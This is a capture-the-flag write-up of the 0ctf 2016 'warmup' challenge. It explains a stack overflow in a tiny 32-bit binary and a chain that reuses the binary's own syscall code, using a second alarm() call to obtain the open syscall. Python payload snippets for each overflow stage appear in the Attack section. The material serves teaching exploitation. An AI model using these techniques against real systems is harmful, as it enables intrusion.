date: 2016-03-14 00:00:00
modified: 2016-03-14 00:00:00
title: 0ctf 2016 - Warmup write-up
author: hugsy
tags: pwn,gef,ida,0ctf-2016,x86
category: ctf

I participated to [0ctf](https://ctftime.org/team/4419/) but only had time to play for
the reversing challenge `trace` (write-up coming up soon) during the competition
time.

I did this challenge only for fun after the CTF was over so I do not know the
flag, and since I found it interesting, I decided to write a quick write-up.

And kudos to all teams who solved it !


### Info ###


```bash
gef➤  !file ./warmup
./warmup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, BuildID[sha1]=c1791030f336fcc9cda1da8dc3a3f8a70d930a11, stripped
gef➤  checksec warmup
[+] checksec for 'warmup'
Canary:                                           No
NX Support:                                       Yes
PIE Support:                                      No
RPATH:                                            No
RUNPATH:                                          No
Partial RelRO:                                    No
Full RelRO:                                       No
```

Pretty stripped down file, very small (which seemed weird for a statically
linked file). Stack canary and PIE are not on, but NX is.


### Vulnerability ###

The binary is really small, does not do much either, so the vulnerability is
quite easy to find and trigger.

![vuln](https://i.imgur.com/jpU2YsD.png)

At 0x08048174, We have a `read(socket, buffer, 52)` where buffer can only
contain 32 bytes, so we have a classic stack overflow. A part of the challenge
is however due to the fact that our controlled part is quite limited
(i.e. 52-32=20 bytes=5 DWORD).



### Exploitation ###

In addition to not having a lot of gadgets (the source was written in pure
assembly), no libc, etc. 0ctf organizers added that

```
notice: This service is protected by a sandbox, you can only read the flag at /home/warmup/flag
```

Meaning: we cannot simply write `/bin/sh` somewhere in memory, set `eax` to 11
and simply use a gadget to set `ebx`, `ecx`, `edx` to value loaded from the
stack. We have to go all the way to open, read, write back the value of the flag
located in `/home/warmup/flag`.

This lead to a much funkier way to exploit.


#### Objective ####

The objective here seems pretty straight forward. We need to :

   1. Write `/tmp/flag` in a predictable and writable location ( anywhere in the
   `.data` section will do just fine).
   1. Forge a `sys_open(flag, RWX)` gadget
   1. Forge a `sys_read(fd, another_writeable_location, 50)` gadget
   1. Forge a `sys_write(socket, another_writeable_location, 50)`

And it is done! In theory it seems pretty easy, but it took me a few hours
(never underestimate a challenge ☺).


#### Interesting gadgets ####

What the binary provides us with are gadgets to read and write:
```bash
--read
.text:0804811D                 mov     eax, 3
.text:08048122                 mov     ebx, [esp+fd]   ; fd
.text:08048126                 mov     ecx, [esp+addr] ; addr
.text:0804812A                 mov     edx, [esp+len]  ; len
.text:0804812E                 int     80h             ; LINUX - sys_read

--write
.text:08048135                 mov     eax, 4
.text:0804813A                 mov     ebx, [esp+fd]   ; fd
.text:0804813E                 mov     ecx, [esp+addr] ; addr
.text:08048142                 mov     edx, [esp+len]  ; len
.text:08048146                 int     80h             ; LINUX - sys_write
```

Where the arguments are read from the limited stack we control.

However, we do not have an `sys_open` gadget, but since we can control `ebx`
from the stack, all we need is to find a way to set `eax` to
[5](https://raw.githubusercontent.com/torvalds/linux/master/arch/x86/entry/syscalls/syscall_32.tbl)

My original intention was to force a call to `sys_read` from our socket, and
send 5 bytes of junk data so that the syscall can return with the right value in
`eax`. Unfortunately, we do not have enough space in our stack to chain correctly our
`read` arguments, then jump into it and finally jump back to our next gadget ☹ .

After quite some time, I realized that `warmup` starts by initializing an alarm
for 10 seconds (which when SIGALARM is received, will kill the
program).
```bash
.text:0804810D                 mov     eax, 27
.text:08048112                 mov     ebx, [esp+seconds] ; seconds
.text:08048116                 int     80h             ; LINUX - sys_alarm
```

Nevertheless, this could be valuable to us, because RTFM:

>
>       alarm()  returns  the number of seconds remaining until any previously
>       scheduled alarm was due to be delivered, or zero if there was no
>       previously scheduled alarm.
>

That means that if we jump a second time into the gadget @0x0804810D (i.e. call
`alarm()` a second time), `eax` will be populated with whatever time is left
before SIGALRM is issued!
And since `alarm()` can take any integer as argument, our syscall will not
return as an error! So by sleeping 5 seconds, `sys_alarm` will return with `eax`
set to `NR_sys_open` (5), and we can use the stack to populate the other
registers required for `sys_open`!


#### Attack ####

Again, because of our limited space in the stack, we need to trigger the
vulnerability multiple times. To do, we have to perform only one operation, then
return to the original function (`0x0804815A`), and let the control flow repeat
again until it re-hit our vulnerability.

So let's go back to the steps we set in the *Objective* part for the
exploitation part:

Writing `/tmp/flag` in a predictable and writable location can be done with the
following gadgets:
```python
    p = "A"*32
    p+= i_s(sys_read)
    p+= i_s(ret_to_orginal_function) # ret back to vuln function
    p+= i_s(0) # fd
    p+= i_s(writable_addr) # addr
    p+= i_s(len(flag_path)) # len
    s.write(p)
    s.read_until("Good Luck!\n")
```

Now we have to sleep !! ☺
```python
    time.sleep(5)
```

Now we can send our second payload, to call `alarm`, setting `eax` to
`NR_sys_open`, and append the other arguments:
```python
    p = "A"*32
    p+= i_s(sys_alarm)
    p+= i_s(set_ebx_ecx_edx_int80)
    p+= i_s(ret_to_orginal_function)
    p+= i_s(writable_addr)
    p+= i_s(7) # READ|WRITE|EXECUTE
    s.write(p)
    s.read_until("Good Luck!\n")
```

We have now a file descriptor open to our flag file! Let's read its content:
```python
    p = "A"*32
    p+= i_s(sys_read)
    p+= i_s(ret_to_orginal_function)
    p+= i_s(5) # file_fd
    p+= i_s(writable_addr2)
    p+= i_s(20)
    s.write(p)
    s.read_until("Good Luck!\n")
```

... And write it back to our socket (and exit cleanly, just because):
```python
    p = "A"*32
    p+= i_s(sys_write)
    p+= i_s(sys_exit)
    p+= i_s(1) # fd stdout
    p+= i_s(writable_addr2)
    p+= i_s(20)
    s.write(p)
```

This write-up does not give justice to the challenge, making it look easy. But
it was not. I really like how you are made to create really inventive and neat
technique for subverting existing calls to set up the structure the exact way
you want it.

For those who want, the full exploit script is
[here](https://gist.github.com/hugsy/8e31ddc61dba7d4e7c1f). But again, it was
not tested against the game server.

Another good lesson to pay attention to details...
